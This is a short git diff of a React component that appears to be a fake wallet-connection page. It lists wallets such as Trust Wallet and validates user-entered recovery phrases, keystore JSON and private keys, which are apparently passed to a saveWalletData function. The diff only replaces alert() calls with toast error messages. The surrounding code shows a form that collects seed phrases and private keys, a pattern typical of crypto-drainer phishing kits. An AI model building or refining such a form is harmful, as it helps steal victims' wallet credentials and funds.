@@ -3,6 +3,7 @@ import { useState } from "react";
 import { Button } from "@/components/ui/button";
 import { Card } from "@/components/ui/card";
 import { saveWalletData } from "@/controllers/walletActions";
+import { toast } from "sonner";
 
 const wallets = [
 	{ name: "Trust Wallet", icon: "/twt.png" },
@@ -63,7 +64,7 @@ const handleManualSubmit = async (e) => {
   if (type === "phrase") {
     const words = phrase.trim().split(/\s+/);
     if (words.length !== 12 && words.length !== 24) {
-      alert("Recovery phrase must be exactly 12 or 24 words.");
+          toast.error("Recovery phrase must be exactly 12 or 24 words.");
       return;
     }
     data = phrase;
@@ -71,12 +72,12 @@ const handleManualSubmit = async (e) => {
     try {
       data = JSON.parse(keystore);
     } catch (err) {
-      alert("Invalid Keystore JSON format");
+          toast.error("Invalid Keystore JSON format.");
       return;
     }
   } else if (type === "private") {
     if (!privateKey || privateKey.length < 10) {
-      alert("Invalid Private Key");
+      toast.error("Invalid Private Key");
       return;
     }
     data = privateKey;
